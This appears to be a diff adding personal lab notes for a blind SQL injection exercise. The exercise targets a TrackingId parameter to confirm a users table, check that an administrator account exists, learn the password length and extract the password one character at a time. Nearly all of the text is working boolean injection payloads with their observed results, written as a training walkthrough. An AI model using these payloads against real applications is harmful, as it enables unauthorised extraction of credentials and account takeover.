@@ -1,0 +1,22 @@
+Task:
+    1- Extract administrator password
+    2- log in using administrator credentials
+
+-> TrackingId Parameter 
+    SELECT TrackingId from users WHERE TrackingId='oFOrORCFGn8P7Zin'
+
+1) Check we have users table
+    ' and (select 'a' from users limit 1) = 'a' -- -
+    -> Returns Welcome statement.
+
+2) Check administrator username is found in users table
+    ' and (select username from users where username='administrator') = 'administrator' -- -
+    -> administrator username exists
+
+3) Get length of administrators password
+    ' and (select LENGTH(password) from users where username='administrator')=1 -- -
+    -> password length is 20
+
+4) Enumerate the password
+    ' and (select substring(password, 1, 1) from users where username='administrator')='a' -- -
+    -> change the letter index, and the letter to compare with until you found it then go to the next letter.
